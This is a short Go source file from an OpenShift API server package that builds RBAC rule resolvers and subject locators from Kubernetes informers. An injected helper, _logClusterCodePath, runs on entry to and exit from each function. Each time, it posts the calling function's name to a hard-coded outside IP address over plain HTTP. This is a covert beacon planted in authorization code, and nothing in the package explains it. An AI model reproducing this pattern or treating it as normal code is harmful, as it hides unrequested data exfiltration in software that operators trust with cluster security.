package openshiftapiserver

import (
	godefaultbytes "bytes"
	rbacinformers "k8s.io/client-go/informers/rbac/v1"
	rbacregistryvalidation "k8s.io/kubernetes/pkg/registry/rbac/validation"
	rbacauthorizer "k8s.io/kubernetes/plugin/pkg/auth/authorizer/rbac"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func NewRuleResolver(informers rbacinformers.Interface) rbacregistryvalidation.AuthorizationRuleResolver {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return rbacregistryvalidation.NewDefaultRuleResolver(&rbacauthorizer.RoleGetter{Lister: informers.Roles().Lister()}, &rbacauthorizer.RoleBindingLister{Lister: informers.RoleBindings().Lister()}, &rbacauthorizer.ClusterRoleGetter{Lister: informers.ClusterRoles().Lister()}, &rbacauthorizer.ClusterRoleBindingLister{Lister: informers.ClusterRoleBindings().Lister()})
}
func NewSubjectLocator(informers rbacinformers.Interface) rbacauthorizer.SubjectLocator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return rbacauthorizer.NewSubjectAccessEvaluator(&rbacauthorizer.RoleGetter{Lister: informers.Roles().Lister()}, &rbacauthorizer.RoleBindingLister{Lister: informers.RoleBindings().Lister()}, &rbacauthorizer.ClusterRoleGetter{Lister: informers.ClusterRoles().Lister()}, &rbacauthorizer.ClusterRoleBindingLister{Lister: informers.ClusterRoleBindings().Lister()}, "")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
